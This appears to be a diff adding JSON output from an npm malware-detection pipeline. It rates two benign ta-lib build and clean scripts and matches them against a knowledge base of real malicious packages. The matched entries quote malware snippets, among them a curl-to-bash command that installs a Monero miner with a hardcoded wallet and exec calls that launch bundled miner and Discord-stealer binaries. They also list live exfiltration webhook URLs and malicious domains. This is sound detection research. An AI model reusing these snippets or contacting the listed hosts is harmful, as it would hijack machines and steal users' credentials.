+                    "leads_to": "Execution of the malicious npm package on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes, disables TLS validation, and attempts to read sensitive tokens from a hidden directory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data to attacker-controlled infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package contacts remote server to download and execute additional payloads (second-stage malware).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of further malware, full compromise of the developer's environment."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling TLS certificate validation in Node.js processes by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Access to hidden directories and files in user home directories (e.g., ~/.cprice/pricetoken)",
+                    "Outbound network requests to suspicious or attacker-controlled domains (e.g., bi2price.com) during package installation or import",
+                    "Fetching and executing remote payloads as part of package initialization"
+                  ],
+                  "file_indicators": [
+                    ".cprice/pricetoken",
+                    ".cprice/price.dat"
+                  ],
+                  "network_indicators": [
+                    "bi2price.com",
+                    "Outbound requests to /getfullhistory.php endpoint"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0, access hidden files in user directories (such as ~/.cprice/pricetoken), or make outbound network requests to untrusted domains like bi2price.com. Flag packages that read files like ~/.cprice/pricetoken and immediately send their contents externally. Use network monitoring to detect connections to known malicious domains and suspicious endpoints, especially during npm install or package import events."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@fomobro##forex-analytics-fomo/1.0.13/package/lib/ta-lib/build.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "build_slice_1",
+          "code_snippet": "var exec = require('child_process').exec;\nvar msbuildPath = '\"C:/Program Files (x86)/MSBuild/14.0/Bin/';\n\nconsole.log('building talib functions...');\nvar flags = \"\";\n\nif(process.platform == 'win32') {\n  process.chdir('./lib/ta-lib/make/csr/windows/msbuild/');\n\n  exec(msbuildPath + 'MSBuild\" ./ta_lib.sln /property:Configuration=csr /property:Platform=x64', function(err, stdout, stderr) {\n    console.log(stdout, stderr);\n\t});\n} else {\n  var flags = \"\";\n\n  if (process.platform == 'darwin') {\n  \tvar arch = process.arch == 'ia32' ? 'i386' : process.arch == 'x64' ? 'x86_64' : process.arch;\n  \tflags = 'export CFLAGS=\"-arch ' + arch + '\" && export LDFLAGS=\"-arch ' + arch + '\" && ';\n  }\n\n  process.chdir('./lib/ta-lib/make/csr/linux/g++/');\n  exec(flags + 'make');\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.5936735312143961,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code executes platform-specific build commands using child_process.exec, changing directories to build folders and running MSBuild on Windows or make on Unix-like systems. It constructs shell commands with hardcoded paths including '\"C:/Program Files (x86)/MSBuild/14.0/Bin/' and environment variables for architecture flags on macOS. This involves executing system commands with potential to run arbitrary code during build, enabling code execution in the build environment.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code uses child_process.exec to run platform-specific build commands (MSBuild on Windows, make on Unix-like systems) after changing directories to known build folders. This is a common and legitimate pattern in build scripts to compile native code dependencies. Unlike the known malicious patterns, it does not execute bundled or hidden binaries, does not spawn obfuscated or undocumented scripts, nor does it perform suspicious permission changes or silent execution of unknown binaries. The hardcoded MSBuild path and environment variable setup for macOS are typical for build environments. While executing system commands can be risky, in this context it is expected behavior for building native modules and does not indicate malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_056541_snippet_1",
+              "source_package": "gcc-patch (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_056541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.6093086004257202,
+              "code_similarity": 0.6403592824935913,
+              "behavior_similarity": 0.5782579779624939,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function build(...args) {\n    //set a+x to file \"gcc\", run the file, console log ALL output\n    const { execSync } = require('child_process');\n    const output = execSync('chmod a+x ./node_modules/gcc-patch/gcc && ./node_modules/gcc-patch/gcc', { encoding: 'utf-8' });\n    console.log(output);\n}\n\nmodule.exports = build;",
+                "code_behavior": "At runtime, when the build function is called, the code grants executable permissions to a bundled ELF binary named 'gcc' and immediately executes it, capturing and logging its output, resulting in the activation of a concealed cryptocurrency miner.",
+                "malice_analysis": {
+                  "why_suspicious": "Granting execution permissions and running a bundled binary from within a package is highly atypical, especially for a package purporting to be a compiler utility. The executed binary is not a legitimate compiler but a miner.",
+                  "violated_expectations": "A legitimate GCC utility package would provide compiler bindings or wrappers, not execute arbitrary binaries or require such permissions. Executing hidden binaries is not expected behavior for a compiler utility.",
+                  "similar_legitimate_use": "Some build tools may execute compilers or scripts, but these are typically well-documented, transparent, and do not conceal their purpose or bundle unrelated executables.",
+                  "key_indicators": [
+                    "chmod a+x on a bundled binary",
+                    "immediate execution of a local ELF binary",
+                    "no user interaction or explicit consent",
+                    "output logging of a non-transparent process"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when build function is called)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "gcc-patch",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.2",
+                  "why_malicious": "The package 'gcc-patch' impersonates a legitimate GCC compiler utility but actually contains and executes a concealed cryptocurrency miner. Its main script grants execution permissions to a bundled ELF binary and runs it, hijacking the user's CPU resources for unauthorized Monero mining. The binary includes cryptographic and mining-related functions, as well as network strings for mining pool communication, confirming its malicious purpose."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the gcc-patch package, believing it to be a GCC utility.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the build function."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The build function is called, which grants execution permissions to the bundled 'gcc' binary and runs it.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Activation of the concealed miner binary."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The 'gcc' binary initiates Monero mining operations, connects to a remote mining pool, and uses the host's CPU resources for mining.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing unauthorized mining and resource hijacking."
+                  },
+                  {
+                    "step": 4,
+                    "action": "In earlier campaign variants, the build function downloads and executes a remote mining setup script, further automating the deployment of the miner.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Same final goal: unauthorized mining."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Granting executable permissions (chmod a+x) to bundled binaries during runtime",
+                    "Execution of non-transparent ELF binaries from npm packages",
+                    "Network connections to Stratum mining pools (stratum+ssl://)",
+                    "Fetching and executing remote shell scripts from GitHub in build scripts",
+                    "Presence of cryptomining-related function names in binaries"
+                  ],
+                  "file_indicators": [
+                    "Bundled ELF binary named 'gcc' in npm package",
+                    "index.js scripts that execute local binaries or fetch remote scripts",
+                    "Presence of mining-related strings or function names in binaries"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to stratum+ssl:// endpoints",
+                    "HTTP(S) requests to raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh",
+                    "Use of hardcoded Monero wallet addresses in scripts"
+                  ],
+                  "how_to_detect": "Monitor npm packages for bundled executable binaries, especially those named after well-known tools (e.g., 'gcc'). Flag scripts that grant execution permissions and run local binaries, or that fetch and execute remote shell scripts. Analyze binaries for mining-related function names and strings. Detect outbound network connections to Stratum mining pools and known cryptomining setup scripts. Correlate package metadata (e.g., suspicious or anonymous authors) with these behaviors for higher confidence."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_998470_snippet_2",
+              "source_package": "coa (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_998470/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.601179838180542,
+              "code_similarity": 0.6682646870613098,
+              "behavior_similarity": 0.534095048904419,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const { exec } = require('child_process');\nvar opsys = process['platform'];\nif (opsys == 'darwin') opsys = 'MacOS';\nelse {\n  if (opsys == 'win32' || opsys == 'win64') {\n    opsys = 'Windows';\n    const { spawn } = require('child_process'),\n    bat = spawn('cmd.exe', ['/c', 'compile.bat']);\n  } else opsys == 'linux' && (opsys = 'Linux');\n}",
+                "code_behavior": "During the preinstall phase, the JavaScript code checks the operating system and, if running on Windows, spawns a new process to execute compile.bat, passing control to a batch script that performs further malicious actions, resulting in OS-specific payload delivery.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is obfuscated and conditionally executes a batch file only on Windows systems, which is a strong indicator of targeted malicious intent. The lack of documentation and the use of child_process to spawn external scripts further increases suspicion.",
+                  "violated_expectations": "Normal packages do not execute OS-specific scripts in an obfuscated and undocumented manner, nor do they spawn batch files during installation.",
+                  "similar_legitimate_use": "Rarely, legitimate packages may run OS-specific setup scripts, but not with obfuscated logic or without clear documentation and user consent.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript logic in installation script",
+                    "Conditional execution based on detected OS",
+                    "Spawning of external batch file (compile.bat) via child_process",
+                    "Lack of documentation or user notification"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (invoked by preinstall script)",
+                  "file_location": "compile.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "coa",
+                  "package_manager": "npm",
+                  "package_versions": "3.0.1, 2.1.1, 2.0.4, 3.1.3, 2.1.3, 2.0.3",
+                  "why_malicious": "The package was maliciously modified to include a preinstall script that executes obfuscated JavaScript and batch files, which in turn download and execute a malicious DLL from an external server. This supply chain attack leverages the installation process to compromise user systems, which is not expected behavior for a legitimate CLI parser library."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script in package.json triggers execution of compile.js during npm package installation.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of obfuscated JavaScript code (compile.js) at install-time"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Obfuscated JavaScript in compile.js checks the operating system and, if Windows, spawns compile.bat.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of batch file (compile.bat) on Windows systems"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Batch file (compile.bat) downloads a malicious DLL from an external server and executes it using regsvr32.exe.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of attacker-controlled DLL (compile.dll) on the victim system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of preinstall scripts that invoke local JavaScript or batch files during npm install",
+                    "Presence of obfuscated JavaScript logic in installation scripts (e.g., compile.js)",
+                    "Batch scripts that attempt to download and execute DLLs from external sources during installation",
+                    "Use of multiple redundant download utilities (curl, wget, certutil.exe) in installation scripts",
+                    "Execution of regsvr32.exe to run newly downloaded DLLs"
+                  ],
+                  "file_indicators": [
+                    "Presence of compile.js and compile.bat in the package root directory",
+                    "Unexpected or recent modifications to package.json scripts.preinstall",
+                    "Creation of compile.dll in the package directory during installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS connections to pastorcryptograph.at",
+                    "Download requests for /3/sdd.dll from external domains"
+                  ],
+                  "how_to_detect": "Monitor npm packages for preinstall scripts that execute local files, especially those named compile.js or compile.bat. Flag any installation scripts that download and execute DLLs from external sources. Watch for outbound connections to known malicious domains such as pastorcryptograph.at and for the use of regsvr32.exe to execute recently downloaded DLLs. Alert on the presence of obfuscated code in installation scripts and on the creation of unexpected files like compile.dll during package installation. Correlate these behaviors to identify supply chain attacks."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_973234_snippet_2",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_973234/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5858936905860901,
+              "code_similarity": 0.501401424407959,
+              "behavior_similarity": 0.6703859567642212,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const { exec } = require('child_process');\nexec('./malicious-binary');",
+                "code_behavior": "At runtime, the code invokes child_process.exec to silently execute a bundled or downloaded binary file, enabling arbitrary code execution on the host system.",
+                "malice_analysis": {
+                  "why_suspicious": "Executing binaries without user awareness can be used to run malware, establish persistence, or perform unauthorized actions on the victim's machine.",
+                  "violated_expectations": "Legitimate packages should only execute binaries with clear user intent, proper documentation, and explicit purpose.",
+                  "similar_legitimate_use": "Build tools or CLI utilities may execute binaries, but this should be clearly documented and only occur in expected contexts.",
+                  "key_indicators": [
+                    "Use of child_process.exec or similar process execution APIs",
+                    "Execution of non-standard or undocumented binaries",
+                    "No user prompt or documentation for binary execution",
+                    "Presence of unexpected binary files in package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "index.js or any JavaScript file in the package",
+                  "required_permissions": [
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "This report does not analyze a specific malicious package, but instead details GuardDog's detection heuristics for identifying malicious behaviors in npm and PyPI packages. The heuristics focus on behaviors such as exfiltration of environment variables, silent execution of binaries, dynamic code execution, and unauthorized install scripts, all of which are commonly observed in malicious packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering install-time or runtime hooks.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Execution of arbitrary code on the victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes, exfiltrating environment variables or secrets.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is sent to attacker-controlled infrastructure"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code executes bundled or downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Further compromise or persistence on the victim's system"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious code dynamically executes obfuscated payloads.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of additional malicious actions, evasion of static analysis"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malicious code or files are published to PyPI but not present in the public source repository.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Supply chain compromise and undetected distribution of malware"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Serialization and exfiltration of process.env or environment variables to external domains",
+                    "Silent execution of bundled or downloaded binaries using child_process.exec or similar APIs",
+                    "Dynamic code execution via eval and base64 decoding of payloads",
+                    "Presence of install-time scripts (preinstall/postinstall) in package.json that execute undocumented or non-standard scripts",
+                    "Discrepancies between published package contents and public source repository, especially unexplained code or files"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious or undocumented postinstall scripts",
+                    "JavaScript files containing Buffer.from(..., 'base64') followed by eval",
+                    "Presence of unexpected binaries or executable scripts in package files",
+                    "Files in PyPI package not present in GitHub repository or with differing content"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to unknown or suspicious domains hardcoded in package code",
+                    "Outbound connections to domains such as webhook.site, pastebin, or attacker-controlled endpoints during install or runtime"
+                  ],
+                  "how_to_detect": "Scan package source code and metadata for serialization and exfiltration of environment variables, use of child_process.exec or similar APIs for silent process execution, and dynamic code execution patterns such as eval with decoded content. Analyze package.json for install-time scripts (preinstall/postinstall) that execute undocumented or non-standard scripts. Compare published package contents with the public source repository to detect unauthorized modifications or unexplained files. Monitor network activity for suspicious outbound requests to hardcoded or non-standard domains during installation or runtime."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_056541_snippet_3",
+              "source_package": "gcc-patch (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_056541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.569506049156189,
+              "code_similarity": 0.6403108239173889,
+              "behavior_similarity": 0.4987012445926666,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "function build(...args) {\n    //set a+x to the file\n    const { exec } = require('child_process');\n    exec(`curl -s -L <https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh> | bash -s 43uAJZNgaMTB8JZv8rgNmEPxtCZtjwqdyHHGsT8DQfWkPpJKgUWADmdZx2TsHX3KPK5b1YE9WqiAVPnVHtv5uMzR4CA373A`, (err, stdout, stderr) => {\n        if (err) {\n            console.log(err);\n            return;\n        }\n    });\n}\n\nmodule.exports = build;",
+                "code_behavior": "At runtime, when the build function is called in the earlier campaign variant, the code downloads and executes a remote shell script from GitHub, which sets up and runs an XMR (Monero) miner using a hardcoded wallet address, resulting in the hijacking of the host's resources for unauthorized mining.",
+                "malice_analysis": {
+                  "why_suspicious": "Downloading and executing remote scripts is a classic malware technique. The use of a hardcoded Monero wallet and silent execution without user notification further indicate malicious intent.",
+                  "violated_expectations": "Legitimate packages do not fetch and execute remote mining scripts without user knowledge or consent. Automated installers may fetch dependencies, but not cryptocurrency miners.",
+                  "similar_legitimate_use": "Some legitimate installers may fetch dependencies, but they do not download and execute cryptomining scripts or use hardcoded wallet addresses.",
+                  "key_indicators": [
+                    "curl and bash pipeline to remote script",
+                    "hardcoded Monero wallet address",
+                    "no user notification or opt-in"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when build function is called, in earlier campaign variant)",
+                  "file_location": "index.js (gcc-builder package)",
+                  "required_permissions": [
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "gcc-patch",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.2",
+                  "why_malicious": "The package 'gcc-patch' impersonates a legitimate GCC compiler utility but actually contains and executes a concealed cryptocurrency miner. Its main script grants execution permissions to a bundled ELF binary and runs it, hijacking the user's CPU resources for unauthorized Monero mining. The binary includes cryptographic and mining-related functions, as well as network strings for mining pool communication, confirming its malicious purpose."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the gcc-patch package, believing it to be a GCC utility.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the build function."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The build function is called, which grants execution permissions to the bundled 'gcc' binary and runs it.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Activation of the concealed miner binary."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The 'gcc' binary initiates Monero mining operations, connects to a remote mining pool, and uses the host's CPU resources for mining.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing unauthorized mining and resource hijacking."
+                  },
+                  {
+                    "step": 4,
+                    "action": "In earlier campaign variants, the build function downloads and executes a remote mining setup script, further automating the deployment of the miner.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Same final goal: unauthorized mining."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Granting executable permissions (chmod a+x) to bundled binaries during runtime",
+                    "Execution of non-transparent ELF binaries from npm packages",
+                    "Network connections to Stratum mining pools (stratum+ssl://)",
+                    "Fetching and executing remote shell scripts from GitHub in build scripts",
+                    "Presence of cryptomining-related function names in binaries"
+                  ],
+                  "file_indicators": [
+                    "Bundled ELF binary named 'gcc' in npm package",
+                    "index.js scripts that execute local binaries or fetch remote scripts",
+                    "Presence of mining-related strings or function names in binaries"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to stratum+ssl:// endpoints",
+                    "HTTP(S) requests to raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh",
+                    "Use of hardcoded Monero wallet addresses in scripts"
+                  ],
+                  "how_to_detect": "Monitor npm packages for bundled executable binaries, especially those named after well-known tools (e.g., 'gcc'). Flag scripts that grant execution permissions and run local binaries, or that fetch and execute remote shell scripts. Analyze binaries for mining-related function names and strings. Detect outbound network connections to Stratum mining pools and known cryptomining setup scripts. Correlate package metadata (e.g., suspicious or anonymous authors) with these behaviors for higher confidence."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103505_261370_snippet_1",
+              "source_package": "xpc.js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_103505_261370/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5571474432945251,
+              "code_similarity": 0.5980950593948364,
+              "behavior_similarity": 0.5161998271942139,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "require('child_process').exec('lib.exe');\nrequire('child_process').exec('lib2.exe');",
+                "code_behavior": "During installation (postinstall), the code executes two bundled Windows executables (lib.exe and lib2.exe) using Node.js child_process, resulting in the launch of malware payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "Executing native Windows binaries during npm package installation is highly anomalous and a well-known malware delivery technique.",
+                  "violated_expectations": "Legitimate npm packages do not execute arbitrary .exe files during postinstall; standard use is for build steps or dependency management, not malware deployment.",
+                  "similar_legitimate_use": "Some packages use postinstall scripts for native module compilation, but not for launching unrelated executables.",
+                  "key_indicators": [
+                    "Execution of bundled .exe files via postinstall script",
+                    "No legitimate build or install purpose for the executables",
+                    "Targeting Windows hosts specifically"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json",
+                  "required_permissions": [
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "xpc.js",
+                  "package_manager": "npm",
+                  "package_versions": "6.6.6",
+                  "why_malicious": "The package is explicitly designed to deliver and execute Discord information-stealing malware. It contains postinstall scripts that launch bundled Windows executables (lib.exe and lib2.exe), which exfiltrate sensitive user data, steal Discord tokens, payment information, and deploy further malware. The entire package is a vehicle for malware delivery and has no legitimate functionality."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During npm package installation, postinstall script executes bundled Windows malware (lib.exe and lib2.exe).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial execution of malware payloads"
+                  },
+                  {
+                    "step": 2,
+                    "action": "lib.exe harvests Discord tokens, browser data, and payment information, then exfiltrates to attacker's Discord webhook.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Credential and data theft"
+                  },
+                  {
+                    "step": 3,
+                    "action": "lib2.exe acts as a dropper, downloading a ZIP archive from a Discord webhook, extracting it, and launching further malware (osloader.exe, winresume.exe).",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Deployment of additional malware components"
+                  },
+                  {
+                    "step": 4,
+                    "action": "osloader.exe and winresume.exe perform advanced malicious actions: privilege escalation, keylogging, screenshot capture, webcam access, and establish a C2 REST API on port 20202.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full system compromise and remote control"
+                  },
+                  {
+                    "step": 5,
+                    "action": "lib.exe delays execution in VM or analysis environments to evade detection.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Anti-analysis, increased stealth"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm postinstall scripts executing bundled .exe files",
+                    "Harvesting and exfiltration of Discord tokens and browser data",
+                    "Network connections to Discord webhooks for data exfiltration or payload download",
+                    "Dropper behavior: downloading and executing additional binaries from remote sources",
+                    "Establishing local REST API servers (e.g., on port 20202) for C2",
+                    "Privilege escalation, keylogging, screenshot, and webcam access",
+                    "Delayed execution or environment checks to evade analysis"
+                  ],
+                  "file_indicators": [
+                    "Presence of lib.exe, lib2.exe in npm package tarball",
+                    "Downloaded files: bundle-5.0.5.zip, osloader.exe, winresume.exe",
+                    "Backdoor DLLs: Backdoor.dll, BackdoorApi.dll",
+                    "Unusual .exe files in node_modules directories"
+                  ],
+                  "network_indicators": [
+                    "Connections to Discord webhooks (e.g., https://discordapp.com/api/webhooks/769943162193707098/jacVRUcz9zBrsstbdIzhzGoRCvfbz3J9BOk8bV5UA_DpUKMtEW3KULQA2q2mBMqjmmsh)",
+                    "Connections to Discord webhooks for payload download (e.g., https://discord.com/api/webhooks/770716126988599316/o7GXYebuPQzx7RQFUD4cTOPMq2gGicypOMyNpFVQsIb9qyVW2bgZ4MMT6c7jvGEDO5Y6)",
+                    "Outbound traffic to Discord domains from npm install context",
+                    "Local REST API server on port 20202"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute .exe files, especially lib.exe and lib2.exe. Flag any network connections to Discord webhooks during or after installation. Detect the presence of suspicious binaries (lib.exe, lib2.exe, osloader.exe, winresume.exe) in node_modules or temporary directories. Watch for processes that open local REST APIs on uncommon ports (e.g., 20202) or exhibit keylogging, screenshot, or webcam access behaviors. Use endpoint security tools to alert on privilege escalation attempts and anti-analysis timing delays."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@fomobro##forex-analytics-fomo/1.0.13/package/lib/ta-lib/clean.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "clean_slice_1",
+          "code_snippet": "var exec = require('child_process').exec;\n\nconsole.log('cleaning talib...');\nvar flags = \"\";\nif (process.platform == 'darwin') {\n  var arch = process.arch == 'ia32' ? 'i386' : process.arch == 'x64' ? 'x86_64' : process.arch;\n  flags = 'export CFLAGS=\"-arch ' + arch + '\" && export LDFLAGS=\"-arch ' + arch + '\" && ';\n}\nprocess.chdir('./lib/ta-lib/make/csr/linux/g++/');\nexec('rm -rf ./build && rm -rf ./node_modules && ' + flags + 'make clean');",
+          "is_malicious": false,
+          "malice_score": 0.5516514460245768,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code changes the working directory to a specific build path and executes a shell command that removes build artifacts and node_modules directories, optionally setting architecture-specific compiler flags on macOS. This involves executing system commands via child_process.exec with hardcoded directory paths and shell commands, enabling cleanup of build environment which could be leveraged for tampering or persistence removal.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code uses child_process.exec to run shell commands that clean build artifacts and node_modules directories in a hardcoded build path. While it involves executing system commands, this is a common and legitimate practice in build or cleanup scripts. Unlike the known malicious patterns, it does not execute unknown or bundled binaries, nor does it perform destructive or system-wide deletion commands. The use of 'rm -rf' is limited to specific local directories related to build cleanup, not root or user home directories. There is no evidence of obfuscation, data exfiltration, or attempts to run unauthorized code. The behavior aligns with typical build environment maintenance rather than malware activity.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205532_973234_snippet_2",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_973234/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5553274154663086,
+              "code_similarity": 0.519058883190155,
+              "behavior_similarity": 0.5915959477424622,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const { exec } = require('child_process');\nexec('./malicious-binary');",
+                "code_behavior": "At runtime, the code invokes child_process.exec to silently execute a bundled or downloaded binary file, enabling arbitrary code execution on the host system.",
+                "malice_analysis": {
+                  "why_suspicious": "Executing binaries without user awareness can be used to run malware, establish persistence, or perform unauthorized actions on the victim's machine.",
+                  "violated_expectations": "Legitimate packages should only execute binaries with clear user intent, proper documentation, and explicit purpose.",
+                  "similar_legitimate_use": "Build tools or CLI utilities may execute binaries, but this should be clearly documented and only occur in expected contexts.",
+                  "key_indicators": [
+                    "Use of child_process.exec or similar process execution APIs",
+                    "Execution of non-standard or undocumented binaries",
+                    "No user prompt or documentation for binary execution",
+                    "Presence of unexpected binary files in package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "index.js or any JavaScript file in the package",
+                  "required_permissions": [
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "This report does not analyze a specific malicious package, but instead details GuardDog's detection heuristics for identifying malicious behaviors in npm and PyPI packages. The heuristics focus on behaviors such as exfiltration of environment variables, silent execution of binaries, dynamic code execution, and unauthorized install scripts, all of which are commonly observed in malicious packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering install-time or runtime hooks.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Execution of arbitrary code on the victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes, exfiltrating environment variables or secrets.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is sent to attacker-controlled infrastructure"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code executes bundled or downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Further compromise or persistence on the victim's system"
+                  },
